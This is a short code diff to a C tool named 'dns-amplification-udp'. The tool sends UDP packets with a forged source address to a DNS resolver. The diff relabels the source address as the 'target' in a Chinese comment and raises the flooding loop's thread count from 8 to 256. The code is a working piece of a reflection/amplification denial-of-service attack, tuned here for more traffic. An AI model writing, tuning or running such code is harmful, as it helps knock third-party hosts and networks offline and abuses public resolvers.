@@ -14,7 +14,7 @@ int main(int argc,char* argv[]){
     if(argc!=11){ fprintf(stdout,"Usage: dns-amplification-udp --source-addr saddr --remote-addr raddr --source-port sport -remote-port rport --n N\n"); exit(0); }
 	else{	
 		
-		/** Example source address and source port **/
+		/** 目标IP地址，端口，解析地址，端口 **/
 		char* source_address = argv[2];
 		char* source_port    = argv[6];
 		char* remote_address = argv[4];
@@ -48,7 +48,7 @@ int main(int argc,char* argv[]){
 		
 		/** Application **/
 		int i,sent=0;
-		omp_set_num_threads(8); // Adjust num threads to your machine //
+		omp_set_num_threads(256); // Adjust num threads to your machine //
 		#pragma omp parallel for reduction(+:sent) if(iter>=2000000)
 		for(i=0;i<iter;i++){
 			if(sendto(sock, buffer, ip_hdr->total_length, 0, (struct sockaddr *)&myaddr, sizeof(myaddr))>=0) sent++;
